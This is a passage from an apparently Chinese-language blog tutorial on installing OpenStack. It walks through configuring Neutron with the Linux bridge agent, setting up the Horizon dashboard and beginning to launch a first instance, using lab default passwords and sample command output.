nova  ####注意这个是nova设置的密码</span><br><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/neutron/tmp</span><br></pre></td></tr></table></figure><h3 id="7-6-配置模块化层2（ML2）插件（-etc-neutron-plugins-ml2-ml2-conf-ini-）"><a href="#7-6-配置模块化层2（ML2）插件（-etc-neutron-plugins-ml2-ml2-conf-ini-）" class="headerlink" title="7.6**配置模块化层2（ML2）插件（/etc/neutron/plugins/ml2/ml2_conf.ini**）"></a><strong>7.6**</strong>配置模块化层2（ML2）插件<strong><strong>（</strong></strong>/etc/neutron/plugins/ml2/ml2_conf.ini<strong>**）</strong></h3><p>编辑配置文件设置如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ml2]</span><br><span class="line">type_drivers = flat,vlan</span><br><span class="line">tenant_network_types =</span><br><span class="line">mechanism_drivers = linuxbridge</span><br><span class="line">[ml2_type_flat]</span><br><span class="line">flat_networks = provider</span><br><span class="line">[securitygroup]</span><br><span class="line">enable_ipset = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="7-7-配置Linux网桥代理（-etc-neutron-plugins-ml2-linuxbridge-agent-ini-）"><a href="#7-7-配置Linux网桥代理（-etc-neutron-plugins-ml2-linuxbridge-agent-ini-）" class="headerlink" title="7.7**配置Linux网桥代理（/etc/neutron/plugins/ml2/linuxbridge_agent.ini**）"></a><strong>7.7**</strong>配置Linux网桥代理<strong><strong>（</strong></strong>/etc/neutron/plugins/ml2/linuxbridge_agent.ini<strong>**）</strong></h3><p>编辑配置文件设置如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[linux_bridge]</span><br><span class="line">physical_interface_mappings = provider:eth1  ####这个是为底层实现网络的网络接口（我这里用了eth1）</span><br><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = <span class="literal">false</span></span><br><span class="line">[securitygroup]</span><br><span class="line"># ...</span><br><span class="line">enable_security_group = <span class="literal">true</span></span><br><span class="line">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span><br></pre></td></tr></table></figure><h3 id="7-8-配置DHCP代理（-etc-neutron-dhcp-agent-ini-）"><a href="#7-8-配置DHCP代理（-etc-neutron-dhcp-agent-ini-）" class="headerlink" title="7.8**配置DHCP代理（/etc/neutron/dhcp_agent.ini**）"></a><strong>7.8**</strong>配置DHCP代理<strong><strong>（</strong></strong>/etc/neutron/dhcp_agent.ini<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT] </span><br><span class="line">＃... </span><br><span class="line">interface_driver  =  linuxbridge </span><br><span class="line">dhcp_driver  =  neutron.agent.linux.dhcp.Dnsmasq </span><br><span class="line">enable_isolated_metadata  =  <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="7-9-配置计算服务以使用网络服务（-etc-nova-nova-conf-）"><a href="#7-9-配置计算服务以使用网络服务（-etc-nova-nova-conf-）" class="headerlink" title="7.9**配置计算服务以使用网络服务（/etc/nova/nova.conf**）"></a><strong>7.9**</strong>配置计算服务以使用网络服务<strong><strong>（</strong></strong>/etc/nova/nova.conf<strong>**）</strong></h3><p>在该[neutron]部分中，配置访问参数，启用元数据代理并配置密钥：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[neutron] </span><br><span class="line">＃... </span><br><span class="line">url  =  http：<span class="comment">//linux-node2：9696 </span></span><br><span class="line">auth_url  =  http：<span class="comment">//linux-node2：35357 </span></span><br><span class="line">auth_type  =  password </span><br><span class="line">project_domain_name  =  <span class="keyword">default</span> </span><br><span class="line">user_domain_name  =  <span class="keyword">default</span> </span><br><span class="line">region_name  =  RegionOne </span><br><span class="line">project_name  =  service </span><br><span class="line">username  =  neutron </span><br><span class="line">password  = neutron      ###在身份识别服务中为用户选择的密码。</span><br><span class="line">service_metadata_proxy  =  <span class="literal">true</span> </span><br><span class="line">metadata_proxy_shared_secret  =  neutron     #  #为元数据代理选择的密码。</span><br></pre></td></tr></table></figure><p>创建扩展链接</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini</span><br></pre></td></tr></table></figure><h3 id="7-10同步数据库"><a href="#7-10同步数据库" class="headerlink" title="7.10同步数据库"></a><strong>7.10同步数据库</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "neutron-db-manage --config-file /etc/neutron/neutron.conf \</span><br><span class="line">  --config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head<span class="string">" neutron</span></span><br></pre></td></tr></table></figure><h3 id="7-10-启动服务"><a href="#7-10-启动服务" class="headerlink" title="7.10 启动服务"></a><strong>7.10 启动服务</strong></h3><p>重新启动计算API服务：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重新启动计算API服务：</span><br><span class="line"># systemctl restart openstack-nova-api.service</span><br></pre></td></tr></table></figure><p>启动网络服务并将其配置为在系统引导时启动。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable neutron-server.service \</span><br><span class="line">  neutron-linuxbridge-agent.service neutron-dhcp-agent.service \</span><br><span class="line">  neutron-metadata-agent.service</span><br><span class="line"># systemctl start neutron-server.service \</span><br><span class="line">  neutron-linuxbridge-agent.service neutron-dhcp-agent.service \</span><br><span class="line">  neutron-metadata-agent.service</span><br></pre></td></tr></table></figure><h2 id="八、网络节点二、（node1-计算节点操作）"><a href="#八、网络节点二、（node1-计算节点操作）" class="headerlink" title="八、网络节点二、（node1 计算节点操作）"></a><strong>八、网络节点二、（node1 计算节点操作）</strong></h2><h3 id="8-1-安装openstack-neutron"><a href="#8-1-安装openstack-neutron" class="headerlink" title="8.1 安装openstack-neutron"></a><strong>8.1 安装openstack-neutron</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-neutron-linuxbridge ebtables ipset</span><br></pre></td></tr></table></figure><h3 id="8-2-配置通用组件（-etc-neutron-neutron-conf-）"><a href="#8-2-配置通用组件（-etc-neutron-neutron-conf-）" class="headerlink" title="8.2**配置通用组件（/etc/neutron/neutron.conf**）"></a><strong>8.2**</strong>配置通用组件<strong><strong>（</strong></strong>/etc/neutron/neutron.conf<strong>**）</strong></h3><p>修改如下配置文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@linux-node2</span></span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers =linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = neutron</span><br><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/neutron/tmp</span><br></pre></td></tr></table></figure><h3 id="8-3-配置计算服务以使用网络服务（-etc-nova-nova-conf-）"><a href="#8-3-配置计算服务以使用网络服务（-etc-nova-nova-conf-）" class="headerlink" title="8.3**配置计算服务以使用网络服务（/etc/nova/nova.conf**）"></a><strong>8.3**</strong>配置计算服务以使用网络服务<strong><strong>（</strong></strong>/etc/nova/nova.conf<strong>**）</strong></h3><p>在该[neutron]部分中，配置访问参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[neutron] </span><br><span class="line">＃... </span><br><span class="line">url  =  http：<span class="comment">//linux-node2：9696 </span></span><br><span class="line">auth_url  =  http：<span class="comment">//linux-node2：35357 </span></span><br><span class="line">auth_type  =  password </span><br><span class="line">project_domain_name  =  <span class="keyword">default</span> </span><br><span class="line">user_domain_name  =  <span class="keyword">default</span> </span><br><span class="line">region_name  =  RegionOne </span><br><span class="line">project_name  =  service </span><br><span class="line">username  =  neutron </span><br><span class="line">password  =  neutron</span><br></pre></td></tr></table></figure><h3 id="8-4-配置Linux网桥代理（-etc-neutron-plugins-ml2-linuxbridge-agent-ini-）"><a href="#8-4-配置Linux网桥代理（-etc-neutron-plugins-ml2-linuxbridge-agent-ini-）" class="headerlink" title="8.4**配置Linux网桥代理（/etc/neutron/plugins/ml2/linuxbridge_agent.ini**）"></a><strong>8.4**</strong>配置Linux网桥代理<strong><strong>（</strong></strong>/etc/neutron/plugins/ml2/linuxbridge_agent.ini<strong>**）</strong></h3><p>编辑文件修改如下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[linux_bridge]</span><br><span class="line">physical_interface_mappings = provider:eht1 #这里是为底层服务的网卡名称</span><br><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = <span class="literal">false</span></span><br><span class="line">[securitygroup]</span><br><span class="line"># ...</span><br><span class="line">enable_security_group = <span class="literal">true</span></span><br><span class="line">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span><br></pre></td></tr></table></figure><h3 id="8-5-启动服务"><a href="#8-5-启动服务" class="headerlink" title="8.5 启动服务"></a><strong>8.5 启动服务</strong></h3><p>重启一下openstack-nova-compute</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># systemctl restart openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>启动Linux桥代理并将其配置为在系统引导时启动：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable neutron-linuxbridge-agent.service</span><br><span class="line"># systemctl start neutron-linuxbridge-agent.service</span><br></pre></td></tr></table></figure><h3 id="8-6-验证操作"><a href="#8-6-验证操作" class="headerlink" title="8.6 验证操作"></a><strong>8.6 验证操作</strong></h3><p>1.运行管理员环境</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ . admin-openrc</span><br></pre></td></tr></table></figure><p>2.查看网络</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">$ openstack extension list --network</span><br><span class="line"></span><br><span class="line">+---------------------------+---------------------------+----------------------------+</span><br><span class="line">| Name                      | Alias                     | Description                |</span><br><span class="line">+---------------------------+---------------------------+----------------------------+</span><br><span class="line">| Default Subnetpools       | <span class="keyword">default</span>-subnetpools       | Provides ability to mark   |</span><br><span class="line">|                           |                           | and use a subnetpool <span class="keyword">as</span>    |</span><br><span class="line">|                           |                           | the <span class="keyword">default</span>                |</span><br><span class="line">| Availability Zone         | availability_zone         | The availability zone      |</span><br><span class="line">|                           |                           | extension.                 |</span><br><span class="line">| Network Availability Zone | network_availability_zone | Availability zone support  |</span><br><span class="line">|                           |                           | <span class="keyword">for</span> network.               |</span><br><span class="line">| Port Binding              | binding                   | Expose port bindings <span class="keyword">of</span> a  |</span><br><span class="line">|                           |                           | virtual port to external   |</span><br><span class="line">|                           |                           | application                |</span><br><span class="line">| agent                     | agent                     | The agent management       |</span><br><span class="line">|                           |                           | extension.                 |</span><br><span class="line">| Subnet Allocation         | subnet_allocation         | Enables allocation <span class="keyword">of</span>      |</span><br><span class="line">|                           |                           | subnets <span class="keyword">from</span> a subnet pool |</span><br><span class="line">| DHCP Agent Scheduler      | dhcp_agent_scheduler      | Schedule networks among    |</span><br><span class="line">|                           |                           | dhcp agents                |</span><br><span class="line">| Tag support               | tag                       | Enables to set tag on      |</span><br><span class="line">|                           |                           | resources.                 |</span><br><span class="line">| Neutron external network  | external-net              | Adds external network      |</span><br><span class="line">|                           |                           | attribute to network       |</span><br><span class="line">|                           |                           | resource.                  |</span><br><span class="line">| Neutron Service Flavors   | flavors                   | Flavor specification <span class="keyword">for</span>   |</span><br><span class="line">|                           |                           | Neutron advanced services  |</span><br><span class="line">| Network MTU               | net-mtu                   | Provides MTU attribute <span class="keyword">for</span> |</span><br><span class="line">|                           |                           | a network resource.        |</span><br><span class="line">| Network IP Availability   | network-ip-availability   | Provides IP availability   |</span><br><span class="line">|                           |                           | data <span class="keyword">for</span> each network and  |</span><br><span class="line">|                           |                           | subnet.                    |</span><br><span class="line">| Quota management support  | quotas                    | Expose functions <span class="keyword">for</span>       |</span><br><span class="line">|                           |                           | quotas management per      |</span><br><span class="line">|                           |                           | tenant                     |</span><br><span class="line">| Provider Network          | provider                  | Expose mapping <span class="keyword">of</span> virtual  |</span><br><span class="line">|                           |                           | networks to physical       |</span><br><span class="line">|                           |                           | networks                   |</span><br><span class="line">| Multi Provider Network    | multi-provider            | Expose mapping <span class="keyword">of</span> virtual  |</span><br><span class="line">|                           |                           | networks to multiple       |</span><br><span class="line">|                           |                           | physical networks          |</span><br><span class="line">| Address scope             | address-scope             | Address scopes extension.  |</span><br><span class="line">| Subnet service types      | subnet-service-types      | Provides ability to set    |</span><br><span class="line">|                           |                           | the subnet service_types   |</span><br><span class="line">|                           |                           | field                      |</span><br><span class="line">| Resource timestamps       | standard-attr-timestamp   | Adds created_at and        |</span><br><span class="line">|                           |                           | updated_at fields to all   |</span><br><span class="line">|                           |                           | Neutron resources that     |</span><br><span class="line">|                           |                           | have Neutron standard      |</span><br><span class="line">|                           |                           | attributes.                |</span><br><span class="line">| Neutron Service Type      | service-type              | API <span class="keyword">for</span> retrieving service |</span><br><span class="line">| Management                |                           | providers <span class="keyword">for</span> Neutron      |</span><br><span class="line">|                           |                           | advanced services          |</span><br><span class="line">| Tag support <span class="keyword">for</span>           | tag-ext                   | Extends tag support to     |</span><br><span class="line">| resources: subnet,        |                           | more L2 and L3 resources.  |</span><br><span class="line">| subnetpool, port, router  |                           |                            |</span><br><span class="line">| Neutron Extra DHCP opts   | extra_dhcp_opt            | Extra options              |</span><br><span class="line">|                           |                           | configuration <span class="keyword">for</span> DHCP.    |</span><br><span class="line">|                           |                           | For example PXE boot       |</span><br><span class="line">|                           |                           | options to DHCP clients    |</span><br><span class="line">|                           |                           | can be specified (e.g.     |</span><br><span class="line">|                           |                           | tftp-server, server-ip-    |</span><br><span class="line">|                           |                           | address, bootfile-name)    |</span><br><span class="line">| Resource revision numbers | standard-attr-revisions   | This extension will        |</span><br><span class="line">|                           |                           | display the revision       |</span><br><span class="line">|                           |                           | number <span class="keyword">of</span> neutron          |</span><br><span class="line">|                           |                           | resources.                 |</span><br><span class="line">| Pagination support        | pagination                | Extension that indicates   |</span><br><span class="line">|                           |                           | that pagination is         |</span><br><span class="line">|                           |                           | enabled.                   |</span><br><span class="line">| Sorting support           | sorting                   | Extension that indicates   |</span><br><span class="line">|                           |                           | that sorting is enabled.   |</span><br><span class="line">| security-group            | security-group            | The security groups        |</span><br><span class="line">|                           |                           | extension.                 |</span><br><span class="line">| RBAC Policies             | rbac-policies             | Allows creation and        |</span><br><span class="line">|                           |                           | modification <span class="keyword">of</span> policies   |</span><br><span class="line">|                           |                           | that control tenant access |</span><br><span class="line">|                           |                           | to resources.              |</span><br><span class="line">| standard-attr-description | standard-attr-description | Extension to add           |</span><br><span class="line">|                           |                           | descriptions to standard   |</span><br><span class="line">|                           |                           | attributes                 |</span><br><span class="line">| Port Security             | port-security             | Provides port security     |</span><br><span class="line">| Allowed Address Pairs     | allowed-address-pairs     | Provides allowed address   |</span><br><span class="line">|                           |                           | pairs                      |</span><br><span class="line">| project_id field enabled  | project-id                | Extension that indicates   |</span><br><span class="line">|                           |                           | that project_id field is   |</span><br><span class="line">|                           |                           | enabled.                   |</span><br><span class="line">+---------------------------+---------------------------+----------------------------+</span><br></pre></td></tr></table></figure><p>\1. 查看网络</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>$ openstack network agent list</span><br><span class="line"><span class="number">4.</span></span><br><span class="line"><span class="number">5.</span>+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+</span><br><span class="line"><span class="number">6.</span>| ID                                   | Agent Type         | Host       | Availability Zone | Alive | State | Binary                    |</span><br><span class="line"><span class="number">7.</span>+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+</span><br><span class="line"><span class="number">8.</span>| <span class="number">0400</span>c2f6<span class="number">-4</span>d3b<span class="number">-44</span>bc<span class="number">-89</span>fa<span class="number">-99093432</span>f3bf | Metadata agent     | controller | None              | True  | UP    | neutron-metadata-agent    |</span><br><span class="line"><span class="number">9.</span>| <span class="number">83</span>cf853d-a2f2<span class="number">-450</span>a<span class="number">-99</span>d7-e9c6fc08f4c3 | DHCP agent         | controller | nova              | True  | UP    | neutron-dhcp-agent        |</span><br><span class="line"><span class="number">10.</span>| ec302e51<span class="number">-6101</span><span class="number">-43</span>cf<span class="number">-9</span>f19<span class="number">-88</span>a78613cbee | Linux bridge agent | compute    | None              | True  | UP    | neutron-linuxbridge-agent |</span><br><span class="line"><span class="number">11.</span>| fcb9bc6e<span class="number">-22</span>b1<span class="number">-43</span>bc<span class="number">-9054</span><span class="number">-272</span>dd517d025 | Linux bridge agent | controller | None              | True  | UP    | neutron-linuxbridge-agent |</span><br><span class="line"><span class="number">12.</span>+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+</span><br></pre></td></tr></table></figure><h2 id="九、-Dashboard-（node2控制节点操作）"><a href="#九、-Dashboard-（node2控制节点操作）" class="headerlink" title="九、**Dashboard**（node2控制节点操作）"></a><strong>九、**</strong>Dashboard<strong>**（node2控制节点操作）</strong></h2><h3 id="9-1-安装"><a href="#9-1-安装" class="headerlink" title="9.1 安装"></a><strong>9.1 安装</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-dashboard</span><br></pre></td></tr></table></figure><h3 id="9-2配置主配置文件（-etc-openstack-dashboard-local-settings-）"><a href="#9-2配置主配置文件（-etc-openstack-dashboard-local-settings-）" class="headerlink" title="9.2配置主配置文件（**/etc/openstack-dashboard/local_settings**）"></a><strong>9.2配置主配置文件（**</strong>/etc/openstack-dashboard/local_settings<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">OPENSTACK_HOST = <span class="string">"linux-node2"</span></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">'*'</span>]</span><br><span class="line">SESSION_ENGINE = <span class="string">'django.contrib.sessions.backends.cache'</span></span><br><span class="line"></span><br><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">         <span class="string">'BACKEND'</span>: <span class="string">'django.core.cache.backends.memcached.MemcachedCache'</span>,</span><br><span class="line">         <span class="string">'LOCATION'</span>: <span class="string">'controller:11211'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">OPENSTACK_KEYSTONE_URL = <span class="string">"http://%s:5000/v3"</span> % OPENSTACK_HOST</span><br><span class="line">OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPENSTACK_API_VERSIONS = &#123;</span><br><span class="line">    <span class="string">"identity"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"image"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"volume"</span>: <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line">OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = <span class="string">"Default"</span></span><br><span class="line">OPENSTACK_KEYSTONE_DEFAULT_ROLE = <span class="string">"user"</span></span><br><span class="line">OPENSTACK_NEUTRON_NETWORK = &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'enable_router'</span>: False,</span><br><span class="line">    <span class="string">'enable_quotas'</span>: False,</span><br><span class="line">    <span class="string">'enable_distributed_router'</span>: False,</span><br><span class="line">    <span class="string">'enable_ha_router'</span>: False,</span><br><span class="line">    <span class="string">'enable_lb'</span>: False,</span><br><span class="line">    <span class="string">'enable_firewall'</span>: False,</span><br><span class="line">    <span class="string">'enable_vpn'</span>: False,</span><br><span class="line">    <span class="string">'enable_fip_topology_check'</span>: False,</span><br><span class="line">&#125;</span><br><span class="line">TIME_ZONE = <span class="string">"Asia/Shanghai "</span></span><br></pre></td></tr></table></figure><h3 id="9-4重启服务"><a href="#9-4重启服务" class="headerlink" title="9.4重启服务"></a><strong>9.4重启服务</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># systemctl restart httpd.service memcached.service</span><br></pre></td></tr></table></figure><h3 id="9-5-访问openstack"><a href="#9-5-访问openstack" class="headerlink" title="9.5 访问openstack"></a><strong>9.5 访问openstack</strong></h3><p><a href="http://192.168.57.145/dashboard/auth/login/" target="_blank" rel="noopener">http://192.168.57.145/dashboard/auth/login/</a></p><p><img src="http://yun.name168.cn/OpenStack001.png" alt="&quot;OpenStack&quot;"></p><p><img src="http://yun.name168.cn/OpenStack002.png" alt="&quot;OpenStack&quot;"></p><h2 id="十、启动第一个实例"><a href="#十、启动第一个实例" class="headerlink" title="十、启动第一个实例"></a><strong>十、启动第一个实例</strong></h2><h3 id="10-1-创建第一个实例"><a href="#10-1-创建第一个实例" class="headerlink" title="10.1 创建第一个实例"></a><strong>10.1 创建第一个实例</strong></h3><p>首先是我选用的网络类型是提供商网络（）</p><p>创建一个环境</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openstack flavor create --id <span class="number">0</span> --vcpus <span class="number">1</span> --ram <span class="number">1024</span> --disk <span class="number">10</span> m1.nano</span><br><span class="line">##########</span><br><span class="line">ID表示为唯一识别的标志</span><br><span class="line">--ram 表示内存的大小</span><br><span class="line">--disk <span class="number">10</span> 代表存储空间为<span class="number">10</span>G</span><br><span class="line">M1.nano 为名字</span><br></pre></td></tr></table></figure><h3 id="10-2-生成一个密钥对"><a href="#10-2-生成一个密钥对" class="headerlink" title="10.2**生成一个密钥对**"></a><strong>10.2**</strong>生成一个密钥对**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ . demo-openrc</span><br><span class="line">$ ssh-keygen -q -N <span class="string">""</span></span><br><span class="line">$ openstack keypair create --public-key ~<span class="regexp">/.ssh/i</span>d_rsa.pub mykey</span><br><span class="line">+-------------+-------------------------------------------------+</span><br><span class="line">| Field       | Value                                           |</span><br><span class="line">+-------------+-------------------------------------------------+</span><br><span class="line">| fingerprint | ee:<span class="number">3</span>d:<span class="number">2</span>e:<span class="number">97</span>:d4:e2:<span class="number">6</span>a:<span class="number">54</span>:<span class="number">6</span>d:<span class="number">0</span>d:ce:<span class="number">43</span>:<span class="number">39</span>:<span class="number">2</span>c:ba:<span class="number">4</span>d |</span><br><span class="line">| name        | mykey                                           |</span><br><span class="line">| user_id     | <span class="number">58126687</span>cbcc4888bfa9ab73a2256f27                |</span><br><span class="line">+-------------+-------------------------------------------------+</span><br></pre></td></tr></table></figure><p>查看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ openstack keypair list</span><br><span class="line"></span><br><span class="line">+-------+-------------------------------------------------+</span><br><span class="line">| Name  | Fingerprint                                     |</span><br><span class="line">+-------+-------------------------------------------------+</span><br><span class="line">| mykey | ee:<span class="number">3</span>d:<span class="number">2</span>e:<span class="number">97</span>:d4:e2:<span class="number">6</span>a:<span class="number">54</span>:<span class="number">6</span>d:<span class="number">0</span>d:ce:<span class="number">43</span>:<span class="number">39</span>:<span class="number">2</span>c:ba:<span class="number">4</span>d |</span><br><span class="line">+-------+-------------------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="10-3创建一个icmp"><a href="#10-3创建一个icmp" class="headerlink" title="10.3创建一个icmp"></a><strong>10.3创建一个icmp</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openstack security group rule create --proto icmp <span 